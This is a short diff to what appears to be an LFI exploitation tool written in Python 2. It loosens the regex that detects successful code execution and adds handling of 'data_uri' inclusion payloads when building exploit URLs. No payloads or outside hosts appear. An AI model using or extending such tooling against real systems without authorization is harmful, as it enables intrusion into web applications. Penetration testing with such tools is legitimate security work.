@@ -41,7 +41,7 @@ class LFIExec (object):
     # check if we got code exec
     def __check (self, content):
         lines = content.split ('\n')
-        regexp = re.compile (self.lfi.tag_exec_code)
+        regexp = re.compile ('.*' + self.lfi.tag_exec_code + '.*')
         for line in lines:
             if len (regexp.findall (line)) != 0:
                 return True
@@ -60,7 +60,10 @@ class LFIExec (object):
             # prepare request before trying exploitation
             purl = prepare_request (self.lfi, payload)
             # prepare url
-            url = purl.replace (self.lfi.payload_placeholder, self.lfi.root_path + lfi['path'])
+            if lfi['type'] != 'data_uri':
+                url = purl.replace (self.lfi.payload_placeholder, self.lfi.root_path + lfi['path'])
+            else:
+                url = purl
             print '    {0}'.format (url)
             # exec
             if lfi['type'] == 'post':
